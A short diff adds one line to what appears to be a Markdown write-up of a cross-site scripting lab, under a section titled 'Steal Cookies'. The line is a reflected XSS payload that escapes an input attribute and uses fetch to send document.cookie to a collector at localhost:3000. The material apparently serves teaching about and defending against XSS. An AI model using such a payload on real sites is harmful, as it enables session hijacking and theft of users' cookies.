@@ -28,5 +28,8 @@ The goal is to craft a URL that, when accessed, will cause the victim's browser 
 
 ## 3.2. Steal Cookies
 
+" size=10><script>fetch(`http://localhost:3000/cookie/${document.cookie}`)</script><input type="hidden
+
+
 ## 3.3. Protect
 
